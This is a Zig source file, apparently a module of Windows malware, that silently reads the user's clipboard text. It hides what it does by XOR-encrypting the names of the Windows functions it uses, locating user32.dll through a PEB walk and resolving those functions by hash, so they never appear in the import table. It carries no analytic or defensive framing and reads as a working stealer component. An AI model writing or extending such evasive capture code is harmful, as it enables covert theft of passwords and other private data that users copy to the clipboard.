const std = @import("std");
const types = @import("../types/types.zig");
const hash = @import("../types/hash.zig");
const peb_walk = @import("../types/peb_walk.zig");
const export_resolve = @import("../types/export_resolve.zig");

const E = struct {
    pub const user32 = hash.xorEncrypt("user32.dll");
    pub const open_clipboard = hash.xorEncrypt("OpenClipboard");
    pub const get_clipboard_data = hash.xorEncrypt("GetClipboardData");
    pub const close_clipboard = hash.xorEncrypt("CloseClipboard");
    pub const global_lock = hash.xorEncrypt("GlobalLock");
    pub const global_unlock = hash.xorEncrypt("GlobalUnlock");
};

const CF_UNICODETEXT: u32 = 13;

const OpenClipboardFn = *const fn (hwnd: types.HANDLE) callconv(.winapi) types.BOOL;
const GetClipboardDataFn = *const fn (format: u32) callconv(.winapi) types.HANDLE;
const CloseClipboardFn = *const fn () callconv(.winapi) types.BOOL;
const GlobalLockFn = *const fn (hMem: types.HANDLE) callconv(.winapi) ?*const anyopaque;
const GlobalUnlockFn = *const fn (hMem: types.HANDLE) callconv(.winapi) types.BOOL;

fn resolveUser32() ?struct {
    open: OpenClipboardFn,
    get: GetClipboardDataFn,
    close: CloseClipboardFn,
    lock: GlobalLockFn,
    unlock: GlobalUnlockFn,
} {
    var user32_buf: [E.user32.len]u8 = undefined;
    hash.xorDecrypt(&E.user32, &user32_buf);

    const user32_module = peb_walk.getModuleByHash(hash.encryptedHashModule(&user32_buf)) orelse return null;

    var open_buf: [E.open_clipboard.len]u8 = undefined;
    hash.xorDecrypt(&E.open_clipboard, &open_buf);
    var get_buf: [E.get_clipboard_data.len]u8 = undefined;
    hash.xorDecrypt(&E.get_clipboard_data, &get_buf);
    var close_buf: [E.close_clipboard.len]u8 = undefined;
    hash.xorDecrypt(&E.close_clipboard, &close_buf);
    var lock_buf: [E.global_lock.len]u8 = undefined;
    hash.xorDecrypt(&E.global_lock, &lock_buf);
    var unlock_buf: [E.global_unlock.len]u8 = undefined;
    hash.xorDecrypt(&E.global_unlock, &unlock_buf);

    const open = @as(OpenClipboardFn, @ptrCast(@alignCast(
        export_resolve.getFunctionByHash(user32_module, hash.hashStringExact(&open_buf, 27)) orelse return null,
    )));
    const get = @as(GetClipboardDataFn, @ptrCast(@alignCast(
        export_resolve.getFunctionByHash(user32_module, hash.hashStringExact(&get_buf, 27)) orelse return null,
    )));
    const close = @as(CloseClipboardFn, @ptrCast(@alignCast(
        export_resolve.getFunctionByHash(user32_module, hash.hashStringExact(&close_buf, 27)) orelse return null,
    )));
    const lock = @as(GlobalLockFn, @ptrCast(@alignCast(
        export_resolve.getFunctionByHash(user32_module, hash.hashStringExact(&lock_buf, 27)) orelse return null,
    )));
    const unlock = @as(GlobalUnlockFn, @ptrCast(@alignCast(
        export_resolve.getFunctionByHash(user32_module, hash.hashStringExact(&unlock_buf, 27)) orelse return null,
    )));

    return .{
        .open = open,
        .get = get,
        .close = close,
        .lock = lock,
        .unlock = unlock,
    };
}

pub fn capture(allocator: std.mem.Allocator) ?[]const u8 {
    const funcs = resolveUser32() orelse return null;

    if (funcs.open(@ptrFromInt(0)) == 0) return null;
    defer _ = funcs.close();

    const h_mem = funcs.get(CF_UNICODETEXT);
    if (h_mem == null) return null;

    const ptr = funcs.lock(h_mem) orelse return null;
    defer _ = funcs.unlock(h_mem);

    const mem_ptr: [*]u16 = @ptrCast(@constCast(ptr));
    var len: usize = 0;
    while (mem_ptr[len] != 0) : (len += 1) {}

    if (len == 0) return null;

    var out = std.ArrayList(u8).init(allocator) catch return null;
    for (0..len) |i| {
        const cp = mem_ptr[i];
        if (cp < 0x80) {
            out.append(@as(u8, @intCast(cp & 0x7F))) catch return null;
        } else if (cp < 0x800) {
            out.append(@as(u8, @intCast(0xC0 | (cp >> 6)))) catch return null;
            out.append(@as(u8, @intCast(0x80 | (cp & 0x3F)))) catch return null;
        } else {
            out.append(@as(u8, @intCast(0xE0 | (cp >> 12)))) catch return null;
            out.append(@as(u8, @intCast(0x80 | ((cp >> 6) & 0x3F)))) catch return null;
            out.append(@as(u8, @intCast(0x80 | (cp & 0x3F)))) catch return null;
        }
    }

    return out.toOwnedSlice() catch return null;
}

const testing = std.testing;

test "capture returns null when clipboard unavailable" {
    const result = capture(testing.allocator);
    _ = result;
}

test "E values decrypt correctly" {
    var buf: [E.open_clipboard.len]u8 = undefined;
    hash.xorDecrypt(&E.open_clipboard, &buf);
    try testing.expectEqualSlices(u8, "OpenClipboard", &buf);
}
